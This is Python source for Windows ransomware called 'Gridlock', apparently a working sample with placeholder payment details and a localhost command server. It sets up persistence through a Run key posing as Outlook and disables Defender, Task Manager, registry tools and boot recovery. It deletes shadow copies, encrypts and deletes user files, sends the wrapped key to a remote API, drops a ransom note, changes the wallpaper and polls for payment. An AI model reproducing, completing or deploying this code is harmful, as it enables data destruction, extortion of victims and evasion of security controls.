from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto import Random
from Crypto.Random import random
import os
import sys
import requests
import time
import subprocess 
import win32gui
import ctypes
from shutil import copy, rmtree
import glob
import platform
import struct
import winreg as reg
import base64


class Gridlock:
	
	def __init__(self):
		self.key = 'nothing'
		self.publicIp = self.getIp()
		self.os = platform.system()
		self.deviceType = 'Desktop' if platform.system() == 'Linux' or platform.system() == 'Windows' else 'Mobile'
		self.payStatus = None
		self.publickey = None

		self.sysRoot = os.path.expanduser('~')

		self.appKey = self.sysRoot+r'\AppData\Local\Gridlock\appkey.rogue'

		self.folder = self.sysRoot+r'\AppData\Local\Gridlock'

		self.paths = [

		self.sysRoot+r'\Documents',
		self.sysRoot+r'\Downloads', 
		self.sysRoot+r'\My Downloads',
		self.sysRoot+r'\My Documents', 
		self.sysRoot+r'\Desktop', 
		self.sysRoot+r'\Favorites', 
		self.sysRoot+r'\Music', 
		self.sysRoot+r'\My Videos', 
		self.sysRoot+r'\Videos', 
		self.sysRoot+r'\My Music', 
		self.sysRoot+r'\Contacts',
		self.sysRoot+r'\ssh',
		self.sysRoot+r'\Pictures',
		self.sysRoot+r'\My Pictures'

		]

		self.mylist = [".pdf"]
        
        #sleep rate for encryption and decryption
		self.RATE = 2
		
		# self.mylist = [
		
		# ".key",".ssh",".sql",".txt",".pdf", ".md", ".vba", ".vbs",
		# ".png",".jpg",".avi",".jpeg",".ods",".bak", ".ps1", ".js",
		# ".rtf",".docx",".doc",".docm",".xls",".ppt",".pptx",".rar",
		# ".zip",".mp3","wmv",".mp4", ".7z", ".csv", ".vcf", ".dotm", 
		# ".potm", ".potx", ".pptm",".sldx", ".sldm",".xps", ".raw",
		# ".psd", ".svg", ".pps", "odp", ".xlsm", ".doct", ".xltm", ".xml",
		# ".dwg", ".dwt", ".dxf",".dwf",".dst", ".php", ".sqlite",
		# ".swf",".wmv",".m4v",".mov",".3gp",".eps",".ps",".odp", ".ods", ".odg", 
		# ".odf", ".sxw", ".sxi", ".sxc", ".sxd", ".stw",".indd",".xps", ".bmp",".wav"

		# ]

		
		self.clean_temp()

		self.startGridlock()
		
	
	def startGridlock(self):
				
		try:

			if not os.path.exists(self.folder):

				return os.mkdir(self.folder)

		except:
			pass
	   
	def registerStartup(self):

		
		try:
			ext_file = sys.executable
  
			address = self.sysRoot+r'\AppData\Local\Gridlock'+r'\{}'.format(os.path.basename(ext_file))
	  
			if ext_file != address:
				
				#copies the ext file to running dir appdata\local\gridlock
				copy(ext_file, self.folder)
			   
		 
			key = reg.HKEY_CURRENT_USER

			key_value ="Software\Microsoft\Windows\CurrentVersion\Run"
		  
			open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
		  
			reg.SetValueEx(open,"Microsoft Outlook v1.0x",0,reg.REG_SZ,address)
			
			reg.CloseKey(open)



		except Exception as e:
			print(e)
	
	def disableDefender(self):

		try:
		   subprocess.call('REG ADD "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2>&1', shell=True)
		except:
			pass
		  
	
	def disableReg(self):
		
	   

		try:
			subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f > nul 2>&1', shell=True)
		except:
			pass


	def disableAll(self):

		

		try:
		   subprocess.call('bcdedit /set {default} recoveryenabled no > nul 2>&1', shell=True)
		   subprocess.call('bcdedit /set {default} bootstatuspolicy ignoreallfailures > nul 2>&1', shell=True)
		   subprocess.call('REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f > nul 2>&1', shell=True)
		except:
			pass
  

	def del_shadow(self):
		
		if not self.checkfile():
			
			try:

				subprocess.Popen("vssadmin Delete shadows /all /Quiet > nul 2>&1", shell=True)

			except:
				pass
	
			

	
	def clean_temp(self):
	   
		try:
			base_path = sys._MEIPASS

	  
		except:
			base_path = os.path.abspath(".")

   
		base_path = base_path.split("\\") 
		base_path.pop(-1)                
		temp_path = ""                    
		for item in base_path:
			temp_path = temp_path + item + "\\"

		mei_folders = [f for f in glob.glob(temp_path + "**/", recursive=False)]
		for item in mei_folders:
			if item.find('_MEI') != -1 and item != sys._MEIPASS + "\\":
				rmtree(item)
	   
	def getIp(self):
		
		count = 0

		while True:

		   
			count = count + 1

			try:
				return requests.get('https://api.ipify.org').text
				break

			except:

				pass
			
			if count == 5:
				return 'localhost'
				break
	  
			

	def checkfile(self):
		
		if os.path.exists(self.appKey):
			return True
		else:
			return False
			

	def generateKey(self):
	 
		if not self.checkfile():

			key = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz') for i in range(32))
			self.key = key.encode('utf-8')
		   
	#to check file size
	def checkSize(self,file_name):
	
		if file_name != '':

			size = int(f'{round(os.stat(file_name).st_size / (1024 * 1024))}')

			return size


	

	def encrypt_file(self,in_filename, chunksize=64*1024):

		
		try:

			out_filename = in_filename + '.rogue'

			iv = Random.new().read(AES.block_size)
			encryptor = AES.new(self.key, AES.MODE_CBC, iv)
			filesize = os.path.getsize(in_filename)

			with open(in_filename, 'rb') as infile:
				with open(out_filename, 'wb') as outfile:
					outfile.write(struct.pack('<Q', filesize))
					outfile.write(iv)

					while True:
						chunk = infile.read(chunksize)
						if len(chunk) == 0:
							break
						elif len(chunk) % 16 != 0:
							chunk += b' ' * (16 - len(chunk) % 16)

						outfile.write(encryptor.encrypt(chunk))

	
			with open(in_filename, "w") as w:
				w.write("hello world")

			os.remove(in_filename)
			
		except:
			pass

				   

				

	def decrypt_file(self,in_filename,chunksize=24*1024):
		
		try:
			
			out_filename = in_filename[0:-6]

			with open(in_filename, 'rb') as infile:
				origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
				iv = infile.read(16)
				decryptor = AES.new(self.key, AES.MODE_CBC, iv)

				with open(out_filename, 'wb') as outfile:
					while True:
						chunk = infile.read(chunksize)
						if len(chunk) == 0:
							break
						outfile.write(decryptor.decrypt(chunk))

					outfile.truncate(origsize)

			os.remove(in_filename) 

		except:
			pass
			 
	
	def encrypt_system(self):
		
		if self.readKey() != 'encrypted':

			new_file_Arr = []

			for path in self.paths:

				if(os.path.exists(path) and os.path.isdir(path)):

					for rootdir, dirs, files in os.walk(path):

						fileArr = list(set(files))

						for file in fileArr:

							file_ext = os.path.splitext(file)[1]
						   
							if file_ext in self.mylist:    
								
								file_name = os.path.join(rootdir, file)
								if self.checkSize(file_name) <= 2000:

									new_file_Arr.append(file_name)

			
			for file in new_file_Arr:

				self.encrypt_file(file) 
										
				index = new_file_Arr.index(file)

				if len(new_file_Arr) - 1 == index:

					self.key = "nothing"

					self.writeKey(b'encrypted')


				time.sleep(self.RATE)						

									
										



	def decrypt_system(self):      
	   
	
		if self.payStatus == 'Paid':
			

			for path in self.paths:


				if(os.path.exists(path) and os.path.isdir(path)):

					for rootdir, dirs, files in os.walk(path):
						for file in files:
							if file.endswith('rogue') and file != 'appkey.rogue':
								file_name = os.path.join(rootdir, file)
							  
								if self.checkSize(file_name) <= 1300:

									self.decrypt_file(file_name)
									
									time.sleep(self.RATE)
							
		 
																
	def getPublicKey(self):

		if not self.checkfile():

			while True:
				
				try:

					response = requests.post('http://localhost/api/publicKeys', json={'device_type': self.deviceType, 'publicIp': self.publicIp, 'os': self.os})
					response = response.text
				   
					self.publickey = bytes(response, 'utf-8')

					break
				  
				
				except:
					pass

				time.sleep(2)    
	

	def writeKey(self,value):

		try:

			path = reg.HKEY_CURRENT_USER
			key = reg.OpenKeyEx(path, r"SOFTWARE\\")
			newKey = reg.CreateKey(key,"Gridlock")
			#convert to string and base64
			#value = value.decode("utf-8")

			v = base64.b64encode(value)

			v = v.decode("utf-8")

			reg.SetValueEx(newKey, "data", 0, reg.REG_SZ, v)

			if newKey:
				reg.CloseKey(newKey)

		except Exception as e:
			pass

	def readKey(self):
		
		try:

			path = reg.HKEY_CURRENT_USER
			key = reg.OpenKeyEx(path, r"SOFTWARE\\Gridlock\\")
			value = reg.QueryValueEx(key,"data")

			if key:
				reg.CloseKey(key)


			v = bytes(value[0], 'utf-8')

			v =  base64.b64decode(v)	

			self.key = v

			if  v == b'encrypted':
				self.key = 'nothing'
				return 'encrypted'

		except Exception as e:
			pass


	
	def encrypt_key(self):
		
		if not self.checkfile():

			
			self.publickey = self.publickey.replace(b'\\n', b'\n')

			rsaKey = RSA.import_key(self.publickey)

			public_crypter =  PKCS1_OAEP.new(rsaKey)
		   
			encrypted_key = public_crypter.encrypt(self.key)

			get_status = self.updateKey(encrypted_key)

			if get_status == 'done':

				with open(self.appKey, 'wb') as w:
					w.write(encrypted_key)

				self.writeKey(self.key)

				self.key = "nothing"    

		
		   
		  

	def updateKey(self,encrypted_key):

		while True:
			
			try:

				response = requests.post('http://localhost/api/enc-fernet_key', json={'enc_fernet_key': str(encrypted_key), 'publickey': str(self.publickey)}) 

				return 'done'

				break

			except Exception as e:

				pass

			time.sleep(2)


	
	def ransom_text(self):

	   
		desktop_path = self.sysRoot+r'\Desktop\RANSOM_NOTE.txt'

		file = self.sysRoot+r'\AppData\Local\Gridlock\RANSOM_NOTE.txt'

		self.startGridlock()

		note = f'''

Welcome To Gridlock !!!

A vulnerability has been discovered on your system, exploited and hence this malware has been installed on your system.
		
To recover your files, please follow these steps:
1. Purchase decryption key by paying USD XXX to this wallet XXXXXXXXXX
2. Email Paid to XXXXXXX with mail.
3. Payment confirmation will be done and shortly after, decryption process will be done on your device remotely.

		'''
		
		if os.path.exists(file) == False:

			with open(file, 'w') as f:
				f.write(note)      
		
		if os.path.exists(desktop_path) == False:
			
			copy(file, desktop_path)   
	

	def change_background(self):

						   
		try:
			

			bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

			path = os.path.abspath(os.path.join(bundle_dir, 'hackedyou.jpg'))

			desktop_path = f'{self.sysRoot}/Desktop/gridXXXlock.jpg'

			if os.path.isfile(desktop_path) == False:

				copy(path, desktop_path)
			
			SPI_SETDESKWALLPAPER = 20
			
			ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, desktop_path, 0)
		
		except:
		   pass
	

	def ransom_note(self):
	   
		
		file = self.sysRoot+r'\AppData\Local\Gridlock\RANSOM_NOTE.txt'

		folder = self.sysRoot+r'\AppData\Local\Gridlock'

		
		if not os.path.exists(file):

			self.ransom_text()


		try:

			ransom = subprocess.Popen(['notepad.exe', file])
		except:
			pass    
		count = 0 
		while True:
			time.sleep(0.1)
			top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
			if top_window == 'RANSOM_NOTE - Notepad':
				
				pass
			else:
			   
				time.sleep(0.1)
				ransom.kill()
			   
				time.sleep(0.1)

				try:
					ransom = subprocess.Popen(['notepad.exe', file])
				except:
					pass    
		   
			time.sleep(3)
			count +=1 
			
			if count == 3:
				break    
	
	def checkPaymentStatus(self):

		status = 0

		count = 0

		while True:
			
			
			if self.checkfile():
			

				try:

					with open(self.appKey, 'rb') as r:

						encrypted_key = r.read()


					response = requests.post('http://localhost/api/ispaid', json={'enc_fernet_key': str(encrypted_key)})	

					count = count + 1

				
					if response.json()['status'] == 'Paid':
						
						
						self.key = response.json()['fernetkey'][0].encode('utf-8')
					  
						self.payStatus = 'Paid'
	   
						break
				   

				except:

					pass

					

				  
				

			time.sleep(3)  

	   
	def log_decrypt(self):

		while True:
		   
			if self.payStatus == 'Paid':
			
				try:
					with open(self.appKey, 'rb') as f:
						encrypted_key = f.read()
					
			 
					response = requests.post('http://localhost/api/isdecrypted', json={'enc_fernet_key': str(encrypted_key)}) 
					
					break
				   
				except:
					
				   pass

			time.sleep(2)      
		

			  
		 
def main():                 
	

	rw = Gridlock() 
	rw.registerStartup()
	rw.disableDefender()  
	rw.generateKey()
	rw.getPublicKey()
	rw.encrypt_key()
	rw.readKey()
	rw.encrypt_system()
	rw.disableReg()
	rw.disableAll()
	rw.del_shadow() 
	rw.ransom_text()
	rw.change_background()
	rw.ransom_note()
	rw.checkPaymentStatus()
	rw.decrypt_system()
	rw.log_decrypt()
	
   
  
if __name__ == '__main__':
	main()             


